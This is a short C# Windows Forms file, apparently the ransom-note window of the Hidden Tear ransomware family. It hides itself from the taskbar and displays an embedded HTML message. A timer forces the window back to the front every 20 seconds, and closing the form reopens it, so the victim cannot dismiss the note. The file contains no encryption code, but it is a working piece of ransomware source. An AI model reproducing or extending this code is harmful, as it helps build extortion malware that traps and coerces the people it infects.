using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace HiddenTear_Message
{
    public partial class Form1 : Form
    {
        readonly int INTERVAL = 20000;



        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;

            string html = new StreamReader(Assembly.GetExecutingAssembly()
                .GetManifestResourceStream("HiddenTear_Message.Html.Message.html")).ReadToEnd();
            webBrowser1.DocumentText = html;

            Timer timer = new Timer();
            timer.Tick += new EventHandler((s, v) =>
            {
                this.Activate();
            });

            timer.Interval = INTERVAL;
            timer.Start();
         }
        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            new Form1().Show();
        }
    }
}
